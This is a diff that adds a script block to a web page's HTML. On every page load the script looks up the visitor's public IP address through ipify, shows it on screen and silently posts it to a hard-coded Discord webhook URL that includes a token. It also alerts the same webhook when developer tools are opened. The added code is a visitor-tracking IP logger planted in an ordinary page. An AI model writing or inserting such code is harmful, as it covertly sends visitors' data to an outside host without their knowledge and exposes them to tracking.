@@ -87,6 +87,101 @@
    </style>
    </head>
    <body>
+    
+     <font face=Adobe Gothic Std"font
+     size="3" font color="white"><b>
+      <center><br>
+       <p>Your
+        IP
+        Address is: <span
+         id="ip-address"></span></p>
+       </br>
+      </center>
+      
+      <script>
+       const DISCORD_WEBHOOK_URL =
+        'https://discord.com/api/webhooks/1129495250621178067/oZtw_t-b2aYidG23HgVT-hFwP3NnSO-H1cUvJ8OkXMxQf__f37l3FxklY2T3pibTMacs';
+       
+       const getIPAddress =
+        async () => {
+         try {
+          const response =
+           await fetch(
+            'https://api.ipify.org?format=json'
+           );
+          const data = await response
+           .json();
+          const ipAddress = data.ip;
+          displayIPAddress(
+           ipAddress);
+          sendToDiscord(ipAddress);
+         } catch (error) {
+          console.error(
+           'Failed to fetch IP address:',
+           error);
+         }
+        };
+       
+       const displayIPAddress = (
+        ipAddress) => {
+        const ipAddressElement =
+         document
+         .getElementById(
+          'ip-address');
+        ipAddressElement
+         .textContent =
+         ipAddress;
+       };
+       
+       const sendToDiscord = async (
+        ipAddress) => {
+        try {
+         const payload = {
+          content: `IPv4: ${ipAddress}`
+         };
+         
+         const response =
+          await fetch(
+           DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+             'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(
+             payload)
+           });
+         
+         if (response.status !==
+          204) {
+          console.error(
+           'Failed to log IP address'
+          );
+         }
+        } catch (error) {
+         console.error(
+          'Failed to log IP address:',
+          error);
+        }
+       };
+       
+       window.addEventListener('load',
+        getIPAddress);
+       
+       
+       window.addEventListener(
+        'devtoolschange', (
+         event) => {
+         if (event.detail.isOpen) {
+          console.log(
+           'IDS Detected Developer tools or inspect element opened'
+          );
+          sendToDiscord(
+           'IDS Detected Developer tools or inspect element opened'
+          );
+         }
+        });
+      </script>
+    
     <div class="container">
      <div class="logo">
       <img
